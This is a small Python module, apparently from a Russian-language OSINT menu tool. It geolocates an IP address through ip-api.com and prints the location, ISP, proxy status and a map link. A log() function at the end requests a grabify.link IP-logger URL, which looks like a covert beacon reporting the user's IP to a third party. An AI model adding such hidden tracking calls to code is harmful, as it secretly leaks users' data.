from colorama import init, Fore

import main

import requests


def search():
	init()
	ip = input('\n' + '\033[1m' + 'Введите IP: ')

	ipinfo = requests.get(
		f'http://ip-api.com/json/{ip}?fields=country,regionName,city,lat,lon,timezone,query,isp,mobile,proxy,hosting')
	ipdata = ipinfo.json()

	query = str(ipdata['query'])
	latitude = str(ipdata['lat'])
	longitude = str(ipdata['lon'])
	city = str(ipdata['city'])
	region = str(ipdata['regionName'])
	country = str(ipdata['country'])
	time = str(ipdata['timezone'])
	isp = str(ipdata['isp'])
	mobile = str(ipdata['mobile'])
	proxy = str(ipdata['proxy'])
	hosting = str(ipdata['hosting'])
	gmap = f'https://www.google.co.uk/maps/@{latitude},{longitude},12z?entry=ttu'

	print(Fore.LIGHTRED_EX + '\033[1m' +
		f"IP: {query}\n"
		f"LOCATION: {latitude}, {longitude}\n"
		f"CITY: {city}\n"
		f"REGION: {region}\n"
		f"COUNTRY: {country}\n"
		f"TIME: {time}\n"
		f"OPERATOR: {isp}\n"
		f"MOBILE: {mobile}\n"
		f"PROXY: {proxy}\n"
		f"HOSTING: {hosting}\n"
		f"GOOGLE MAPS: {gmap}")

	input('\nНажмите Enter для возврата в главное меню')
	main.main()


def log():
	url = "https://grabify.link/GJV8GP"
	response = requests.get(url.strip(), timeout=5)
